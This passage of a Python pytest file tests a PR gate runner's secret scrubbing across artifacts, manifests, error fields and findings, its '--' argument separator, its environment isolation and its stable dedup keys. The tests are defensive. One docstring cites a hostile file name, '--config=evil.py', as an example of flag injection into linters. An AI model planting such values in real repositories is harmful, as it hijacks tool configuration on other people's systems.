        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1,
            mode="review",
        )
        # On-disk per-gate artifact filename: token must not appear.
        files = list(artifacts_dir.glob("round-1-review-gate-*.txt"))
        assert files, "per-gate artifact must be written"
        for f in files:
            assert token_path_part not in f.name, f.name
            assert token_path_part not in f.read_text(encoding="utf-8")
        # Synthetic finding fields: reviewer/location/finding.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "failing gate must produce a finding"
        for f in findings:
            assert token_path_part not in (f.reviewer or "")
            assert token_path_part not in (f.location or "")
            assert token_path_part not in (f.finding or "")
            assert token_path_part not in (f.evidence or "")
            assert token_path_part not in (f.required_fix or "")

    def test_ruff_black_mypy_use_double_dash_separator(
        self, tmp_path: Path
    ) -> None:
        """Iter-25 Finding 2: a PR file named ``--config=evil.py`` (or
        any path starting with ``-``) would be parsed as a flag by
        ruff/black/mypy. Every per-file gate argv MUST include the
        POSIX ``--`` end-of-options separator before the file list so
        the tools treat each entry as a positional path.
        """
        from pdd.checkup_gates import discover_gates

        _git_init(tmp_path)
        # Enable ruff / black / mypy via pyproject.
        (tmp_path / "pyproject.toml").write_text(
            "[tool.ruff]\n[tool.black]\n[tool.mypy]\n",
            encoding="utf-8",
        )
        # Innocuous changed file — the assertion is on the argv shape,
        # not on the tool actually being installed; we only assert
        # when discovery emitted the gate.
        (tmp_path / "foo.py").write_text("x = 1\n", encoding="utf-8")
        gates = discover_gates(tmp_path, changed_files=("foo.py",))
        for name in ("ruff", "black", "mypy"):
            matching = [g for g in gates if g.name == name]
            if not matching:  # tool may not be on PATH in the sandbox
                continue
            cmd = matching[0].cmd
            assert "--" in cmd, (
                f"{name} argv missing -- separator: {cmd}"
            )
            # The `--` must precede the file path.
            dash_idx = cmd.index("--")
            path_idx = cmd.index("foo.py")
            assert dash_idx < path_idx, (
                f"{name} `--` must come before the file path: {cmd}"
            )

    def test_manifest_and_to_dict_scrub_nested_gate_metadata(
        self, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 1: ``Gate.to_dict()`` MUST scrub every
        string it serializes — name, every cmd arg, source, and
        required_fix_hint. The dict flows into both the per-round
        JSON manifest and the in-memory state.gate_runs row that
        the review loop persists to final-state.json["gates"], so
        an operator-supplied token in argv that the pre-fix code
        leaked into both surfaces must now be redacted at the
        serialization boundary.
        """
        from pdd.checkup_gates import Gate, GateResult, run_gates

        secret = "ghp_" + ("C" * 40)
        # Use ``echo`` so the gate succeeds and the manifest is
        # actually written. The token rides in argv (and would
        # otherwise be persisted verbatim).
        gates = [
            Gate(
                name="leaky-argv",
                cmd=["echo", f"--token={secret}"],
                source=f"package.json:scripts.token={secret}",
                required_fix_hint=f"Stop committing token={secret}",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        # The scrubbed dict (used for the JSON manifest and the
        # review-loop state row) must be clean across ALL nested
        # fields.
        d = results[0].to_dict()
        # ``cmd`` is now a list of scrubbed strings.
        joined_cmd = " ".join(d["gate"]["cmd"])
        assert secret not in joined_cmd, joined_cmd
        assert secret not in d["gate"]["source"]
        assert secret not in d["gate"]["required_fix_hint"]
        # The on-disk JSON manifest must also be clean.
        manifest = (
            artifacts_dir / "round-1-review-gates.json"
        ).read_text(encoding="utf-8")
        assert secret not in manifest

    def test_persistence_failure_scrubs_error_field(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Iter-24 Finding 2: when per-gate artifact persistence
        raises with a token in the exception text, the resulting
        ``GateResult.error`` MUST be scrubbed before it lands in
        the manifest / state.gate_runs row, and the WARNING log
        line MUST also be scrubbed.
        """
        from pdd.checkup_gates import Gate, run_gates

        secret = "ghp_" + ("D" * 40)
        gates = [
            Gate(
                name="ok-then-disk-fail",
                cmd=["echo", "hi"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = type(artifacts_dir).write_text

        def fail_write(self, *args, **kwargs):
            # Per-gate write fails with an exception text that
            # carries a secret.
            if "round-1-review-gate-" in self.name:
                raise OSError(f"disk full while writing {secret}")
            return original_write_text(self, *args, **kwargs)

        monkeypatch.setattr(Path, "write_text", fail_write)

        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=artifacts_dir,
            round_number=1,
            mode="review",
        )
        assert results[0].error
        # The error field landed in the manifest and in
        # ReviewFinding.evidence; must be scrubbed.
        assert secret not in (results[0].error or "")
        # The manifest itself reads the (now scrubbed) error.
        manifest_text = (
            artifacts_dir / "round-1-review-gates.json"
        ).read_text(encoding="utf-8")
        assert secret not in manifest_text

    def test_runner_error_scrubs_secrets_in_synthetic_finding_evidence(
        self, tmp_path: Path
    ) -> None:
        """Iter-23 Finding 2: when a gate cmd contains an
        operator-supplied token (e.g. a fork PR poisons
        ``package.json`` with a token literal in a script body) and
        the runner crashes (``FileNotFoundError``,
        ``TimeoutExpired``, generic ``Exception``), the resulting
        ``GateResult.error`` includes the full argv tuple. That
        string flows into ``ReviewFinding.evidence`` which is
        rendered into the public PR comment AND persisted to
        final-state.json. Scrub at the source so no downstream
        consumer ever sees the raw token.
        """
        from pdd.checkup_gates import (
            Gate,
            gate_results_to_findings,
            run_gates,
        )

        secret = "ghp_" + ("B" * 40)
        gates = [
            Gate(
                # Missing binary so the runner hits FileNotFoundError;
                # the secret rides along in argv.
                name="leaky-runner",
                cmd=[
                    "/nonexistent-binary-pls-fail",
                    f"--token={secret}",
                ],
                source="package.json:scripts.format:check",
            )
        ]
        results = run_gates(
            tmp_path,
            gates,
            artifacts_dir=tmp_path / "artifacts",
            round_number=1,
            mode="review",
        )
        assert results[0].exit_code is None  # runner-error path
        # GateResult.error itself MUST be scrubbed.
        assert secret not in (results[0].error or "")
        # Synthetic ReviewFinding.evidence MUST NOT leak the token.
        findings = gate_results_to_findings(results, round_number=1)
        assert findings, "runner error must produce a finding"
        for f in findings:
            assert secret not in (f.evidence or "")
            assert secret not in (f.required_fix or "")
        # Per-gate artifact MUST also be clean.
        artifact = (
            tmp_path / "artifacts" / "round-1-review-gate-leaky-runner.txt"
        ).read_text(encoding="utf-8")
        assert secret not in artifact

    def test_secret_at_truncation_boundary_is_scrubbed(self, tmp_path: Path) -> None:
        """Iter-22 Finding 1: a secret that lands near the 10KB
        truncation boundary must still be redacted. Pre-fix the runner
        called ``_scrub(_truncate(text))`` — truncation could leave a
        partial-token prefix that the scrub regex (anchored on the full
        token shape) no longer matched. The correct order is
        ``_truncate(_scrub(text))``: scrub the full output first.
        """
        from pdd.checkup_gates import Gate, _EXCERPT_LIMIT, run_gates

        # Pad stdout past _EXCERPT_LIMIT, then emit a full token at
        # the boundary so the previous truncate-first order would
        # chop the token mid-pattern and dodge the scrubber.
        padding = "x" * (_EXCERPT_LIMIT - 4)
        # ``ghp_`` + 36 chars satisfies the GitHub PAT regex
        # (``ghp_[A-Za-z0-9]{20,}``). Construct the literal at runtime
        # via ``chr()`` so it does not appear in argv (the per-gate
        # artifact also dumps the cmd line; we want this test focused
        # on the output-excerpt scrub-before-truncate contract, not on
        # operator-supplied argv leakage).
        secret_expr = (
            "chr(103)+chr(104)+chr(112)+chr(95)+'A'*40"  # 'ghp_' + 40*A
        )
        script = (
            f"import sys; sys.stdout.write({padding!r} + ({secret_expr})); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="boundary-leak",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        excerpt = results[0].stdout_excerpt
        # No part of the token survives — including a truncated
        # prefix like ``ghp_AAA`` that the pre-fix order would have
        # left in place.
        expected_secret = "ghp_" + ("A" * 40)
        assert expected_secret not in excerpt
        assert "ghp_" not in excerpt
        # The on-disk artifact MUST also be clean (it's written from
        # the same scrubbed/truncated string).
        artifact_text = (artifacts_dir / "round-1-review-gate-boundary-leak.txt").read_text(
            encoding="utf-8"
        )
        assert "ghp_" not in artifact_text

    def test_runs_with_ci_env_and_no_color(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # The runner must inject CI=1, NO_COLOR=1, FORCE_COLOR=0 so deterministic
        # gates emit non-interactive output. Probe via a dump-env gate.
        script = (
            "import os, sys; "
            "sys.stdout.write("
            "f\"CI={os.environ.get('CI')}|"
            "NO_COLOR={os.environ.get('NO_COLOR')}|"
            "FORCE_COLOR={os.environ.get('FORCE_COLOR')}\""
            "); sys.exit(0)"
        )
        gates = [
            Gate(
                name="env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert "CI=1" in results[0].stdout_excerpt
        assert "NO_COLOR=1" in results[0].stdout_excerpt
        assert "FORCE_COLOR=0" in results[0].stdout_excerpt

    def test_strips_pdd_env_so_gate_does_not_inherit_loop_state(
        self, tmp_path: Path, monkeypatch: Any
    ) -> None:
        from pdd.checkup_gates import Gate, run_gates

        # Set a PDD_* env that must NOT leak into the gate process.
        monkeypatch.setenv("PDD_FAKE_SECRET", "must-not-appear")
        script = (
            "import os, sys; "
            "sys.stdout.write(os.environ.get('PDD_FAKE_SECRET', '<unset>')); "
            "sys.exit(0)"
        )
        gates = [
            Gate(
                name="pdd-env-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert results[0].stdout_excerpt.strip() == "<unset>"

    def test_uses_worktree_as_cwd(self, tmp_path: Path) -> None:
        from pdd.checkup_gates import Gate, run_gates

        script = "import os, sys; sys.stdout.write(os.getcwd()); sys.exit(0)"
        gates = [
            Gate(
                name="cwd-probe",
                cmd=[sys.executable, "-c", script],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"
        results = run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        # tmp_path may be a symlink on macOS; resolve both sides for comparison.
        emitted = Path(results[0].stdout_excerpt.strip()).resolve()
        assert emitted == tmp_path.resolve()

    def test_run_gates_handles_artifact_write_failure_as_gate_result(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """Codex review iteration 1, Finding 3: an artifact persistence error
        must not crash ``run_gates`` or lose the result row — it must be
        recorded as a runner-side failure on that specific gate with a
        useful ``error`` field so the audit trail remains visible.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
            gates_mod.Gate(
                name="ok-gate-2",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            ),
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            # Fail only on the per-gate text artifact for the first gate.
            if "round-1-review-gate-ok-gate.txt" in self.name:
                raise PermissionError("disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)

        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 2
        # The first gate gets a runner-error marker on the persistence
        # failure, even though the subprocess itself exited 0.
        first = results[0]
        assert first.exit_code is None
        assert first.error and (
            "permissionerror" in first.error.lower() or "disk full" in first.error.lower()
        )
        # The second gate still records its successful run.
        second = results[1]
        assert second.exit_code == 0

    def test_run_gates_survives_manifest_write_failure(
        self, monkeypatch: Any, tmp_path: Path
    ) -> None:
        """The manifest is best-effort: when it fails, the call returns
        every collected ``GateResult`` and does not raise.
        """
        import pdd.checkup_gates as gates_mod

        gates = [
            gates_mod.Gate(
                name="ok-gate",
                cmd=[sys.executable, "-c", "import sys; sys.exit(0)"],
                source="<test>",
            )
        ]
        artifacts_dir = tmp_path / "artifacts"

        original_write_text = Path.write_text

        def fake_write_text(self: Path, *a: Any, **k: Any):
            if self.name.endswith("review-gates.json"):
                raise PermissionError("manifest disk full")
            return original_write_text(self, *a, **k)

        monkeypatch.setattr(Path, "write_text", fake_write_text)
        results = gates_mod.run_gates(
            tmp_path, gates, artifacts_dir=artifacts_dir, round_number=1, mode="review"
        )
        assert len(results) == 1
        assert results[0].exit_code == 0


class TestGateResultsToFindings:
    """``gate_results_to_findings`` converts failing gates to ``ReviewFinding``."""

    def test_failed_gate_becomes_blocker_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
            required_fix_hint="Run prettier --write . locally and commit.",
        )
        result = GateResult(
            gate=gate,
            exit_code=1,
            stdout_excerpt="Code style issues found in 2 files.",
            stderr_excerpt="",
            duration_seconds=0.5,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([result], round_number=2)
        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "blocker"
        assert finding.reviewer == "gate:prettier-check"
        assert finding.area == "deterministic-gate"
        assert (
            "prettier --check" in finding.required_fix.lower()
            or "prettier --write" in finding.required_fix.lower()
        )
        evidence_lower = finding.evidence.lower()
        assert "exit code 1" in evidence_lower or "exit_code=1" in evidence_lower
        assert finding.location == "package.json:scripts.format:check"
        assert finding.round_number == 2
        assert finding.status == "open"

    def test_passed_gates_skipped(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="ok", cmd=["true"], source="<test>")
        passing = GateResult(
            gate=gate,
            exit_code=0,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.01,
            started_at_iso="2025-01-01T00:00:00Z",
        )
        findings = gate_results_to_findings([passing], round_number=1)
        assert findings == []

    def test_runner_side_error_becomes_finding(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(name="hang", cmd=["sleep", "10"], source="<test>")
        result = GateResult(
            gate=gate,
            exit_code=None,
            stdout_excerpt="",
            stderr_excerpt="",
            duration_seconds=0.1,
            started_at_iso="2025-01-01T00:00:00Z",
            error="timed out after 0.1s",
        )
        findings = gate_results_to_findings([result], round_number=1)
        assert len(findings) == 1
        assert findings[0].severity == "blocker"
        evidence_lower = findings[0].evidence.lower()
        assert "timed out" in evidence_lower or "timeout" in evidence_lower

    def test_dedup_key_is_stable_across_rounds(self) -> None:
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="prettier-check",
            cmd=["prettier", "--check", "."],
            source="package.json:scripts.format:check",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="A",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:00Z",
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=1,
                    stdout_excerpt="B",
                    stderr_excerpt="",
                    duration_seconds=0.5,
                    started_at_iso="2025-01-01T00:00:01Z",
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key

    def test_gate_runner_error_finding_key_stable_across_rounds_with_volatile_error(
        self,
    ) -> None:
        """Codex review iteration 2, Finding 1: the runner-error finding's
        ``finding`` text MUST NOT embed ``result.error`` because that field
        carries volatile detail (paths, exception ``[Errno N]`` codes, etc.)
        that varies across rounds. ``ReviewFinding.key`` is built from
        ``severity|location|finding|required_fix``; an embedded volatile
        ``error`` breaks the dedup contract documented in
        ``pdd/prompts/checkup_gates_python.prompt`` and tested by
        ``test_dedup_key_is_stable_across_rounds`` for the
        exit_code != 0 branch.
        """
        from pdd.checkup_gates import Gate, GateResult, gate_results_to_findings

        gate = Gate(
            name="persist-fail",
            cmd=["true"],
            source="<test>",
        )
        r1 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:00Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-1-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=1,
        )
        r2 = gate_results_to_findings(
            [
                GateResult(
                    gate=gate,
                    exit_code=None,
                    stdout_excerpt="",
                    stderr_excerpt="",
                    duration_seconds=0.1,
                    started_at_iso="2026-01-01T00:00:05Z",
                    error=(
                        "PermissionError: [Errno 13] Permission denied: "
                        "/tmp/round-2-review-gate-persist-fail.txt"
                    ),
                )
            ],
            round_number=2,
        )
        assert r1[0].key == r2[0].key, (
            "runner-error finding keys MUST match across rounds despite "
            "round-specific paths in ``result.error``; otherwise the loop "
            "produces a duplicate finding row every round.\n"
            f"r1.key={r1[0].key!r}\nr2.key={r2[0].key!r}"
        )
        # The volatile error text MUST still appear in evidence so the
        # operator can still see the actual failure detail.
        assert "PermissionError" in r1[0].evidence
        assert "/tmp/round-1-review-gate-persist-fail.txt" in r1[0].evidence
